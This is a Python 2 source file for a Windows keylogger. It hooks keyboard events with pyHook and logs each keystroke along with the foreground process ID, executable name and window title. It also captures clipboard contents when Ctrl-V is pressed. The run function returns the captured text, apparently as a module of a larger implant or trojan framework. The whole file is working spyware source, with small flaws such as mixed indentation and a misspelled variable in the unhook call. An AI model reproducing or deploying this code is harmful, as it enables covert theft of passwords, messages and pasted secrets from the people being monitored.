from ctypes import *
import sys
import pythoncom
import pyHook 
import win32clipboard
import time

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None

num = 1
s = ""

def get_current_process():
    global s
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # print out the header if we're in the right process
    s = s + "\n[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value) + "\n"

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    global current_window
    global num
    global s
    print "hook"
    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    # if they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        s = s + chr(event.Ascii)
		
	num = num + 1
		
    else:
        # if [Ctrl-V], get the value on the clipboard
        # added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            s = s + "[PASTE] - %s" % (pasted_value)
        else:
            s = s + "[%s]" % event.Key

			
    # pass execution to next hook registered 
    return True
def run(**args):
    print "in run"
    global s
    global num
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    while num < 100:
        time.sleep(0.02)
        pythoncom.PumpWaitingMessages()
    k1.UnhookKeyboard()
    num = 1
    t = s
    s = ""
    return t
